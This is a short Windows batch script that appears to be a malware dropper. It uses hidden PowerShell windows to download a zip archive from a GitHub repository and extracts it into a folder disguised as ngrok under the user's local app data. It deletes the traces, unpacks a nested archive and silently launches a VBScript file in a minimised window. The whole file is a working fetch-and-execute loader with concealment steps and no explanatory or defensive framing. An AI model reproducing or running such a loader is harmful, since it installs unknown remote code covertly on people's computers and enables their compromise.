@echo off
setlocal

set "repo_url=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
set "download_path=%TEMP%\setupdata.zip"
set "extract_to=%LOCALAPPDATA%\ngrok"
set "temp_folder=%extract_to%\mamf-main"
set "zip_file=%extract_to%\data.zip"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%repo_url%', '%download_path%')"
powershell -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%download_path%' -DestinationPath '%extract_to%'"

del /f /q "%download_path%"

xcopy "%temp_folder%\*" "%extract_to%\" /E /H /Y
rmdir /s /q "%temp_folder%"

if exist "%zip_file%" (
    powershell -WindowStyle Hidden -Command "Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('%zip_file%', '%extract_to%')"
    del /f /q "%zip_file%"
)

start "" /min cscript //nologo "%extract_to%\s.vbs"

exit
